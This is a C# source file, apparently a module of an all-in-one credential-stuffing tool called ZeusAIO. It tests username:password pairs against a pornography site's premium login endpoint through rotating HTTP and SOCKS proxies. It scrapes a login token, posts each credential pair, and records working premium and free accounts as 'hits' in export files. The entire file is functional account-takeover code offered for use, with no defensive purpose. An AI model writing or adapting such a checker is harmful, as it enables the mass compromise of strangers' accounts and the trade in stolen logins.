using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Phub
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string Getlogin = httpRequest.Get("https://www.pornhubpremium.com/premium/login").ToString();
                            string access_token = Check.Parse(Getlogin, "token\":\"", "\",\"");
                            string str = "username=" + s[0] + "&password=" + s[1] + "&redirect=&from=pc_premium_login&segment=straight&token=" + access_token;
                            string strResponse = httpRequest.Post("https://www.pornhubpremium.com/front/authenticate", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("message\":\"Invalid username\\/password!") || strResponse.Contains("Account disabled. Please try again later"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("premium_redirect_cookie\":\"1\"")) //hit
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - PORNHUB] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Pornhub_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else if (strResponse.Contains("\"premium_redirect_cookie\":\"0\"")) //freeidolater
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - PORNHUB] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Pornhub_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

